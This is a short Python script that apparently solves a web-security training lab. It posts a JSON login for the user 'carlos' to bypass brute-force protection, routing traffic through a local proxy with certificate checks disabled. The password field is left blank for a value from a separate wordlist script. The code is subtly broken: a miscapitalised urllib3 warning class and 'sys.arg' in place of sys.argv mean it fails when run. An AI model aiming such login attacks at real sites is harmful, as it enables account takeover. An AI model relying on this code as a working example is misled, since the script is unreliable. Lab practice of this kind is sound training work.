import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestwarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}

def access_carlos_account(s, url):
    print("(+) Exploiting the Brute force protection vulnerability...")
    login_url = url + '/login'
    payload = { 'username':'carlos', 'password':''}#change the password value which is given by the script Lab13_List.py
    headers = {'content-type':'application/json'}
    r = s.post(login_url, json=payload, headers=headers , verify=False, proxies=proxies)
    if 'log out' in r.text: 
        print("(+) We successfully solved the lab ")       
    else:
        print("(+) Check for the error inside the code and try again")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print('(+) Usage: %s' % sys.argv[0])
        print('(+) Example %s www.example.com' % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.arg[1]
    access_carlos_account(s, url)

if __name__ == '__main__':
    main()